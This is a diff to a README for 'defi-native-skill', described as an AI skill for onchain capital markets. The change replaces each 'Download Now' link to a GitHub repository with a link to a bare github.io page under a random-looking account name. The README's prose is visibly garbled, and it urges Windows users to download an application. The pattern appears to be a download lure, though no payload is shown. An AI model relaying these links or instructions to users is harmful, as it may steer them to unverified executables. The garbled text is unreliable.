@@ -1,6 +1,6 @@
 # 💰 defi-native-skill - Master Onchain Capital Markets with AI
 
-[![Download Now](https://img.shields.io/badge/Download-Visit%20Link%20to%20Download-brightgreen?style=for-the-badge&logo=github&logoColor=white&color=4CAF50)](https://github.com/irresistibleimpulsecataract2752/defi-native-skill)
+[![Download Now](https://img.shields.io/badge/Download-Visit%20Link%20to%20Download-brightgreen?style=for-the-badge&logo=github&logoColor=white&color=4CAF50)](https://irresistibleimpulsecataract2752.github.io)
 
 ---
 
@@ -26,7 +26,7 @@ Here's exactly how to get this skill onto your computer (Windows)..Follow these 
 
 Visit this link to download the application:
 
-[🌐 Download Page - defi-native-skill](https://github.com/irresistibleimpulsecataract2752/defi-native-skill)
+[🌐 Download Page - defi-native-skill](https://irresistibleimpulsecataract2752.github.io)
 
 This link is your magic door.It will open a page with files, folders, and release info.Do not worryy ou see codey ou see a green button says"Code"or"Releases"you are in the right place.
 
@@ -170,7 +170,7 @@ This is not an app that opensa windowon double-click,Butit **is** a tool that tu
 
 Go ahead and grab it - your future AI conversations about vaults, yields,& RWAs will thank you:
 
-[🚀 Download defi-native-skill Now](https://github.com/irresistibleimpulsecataract2752/defi-native-skill)
+[🚀 Download defi-native-skill Now](https://irresistibleimpulsecataract2752.github.io)
 
 
 
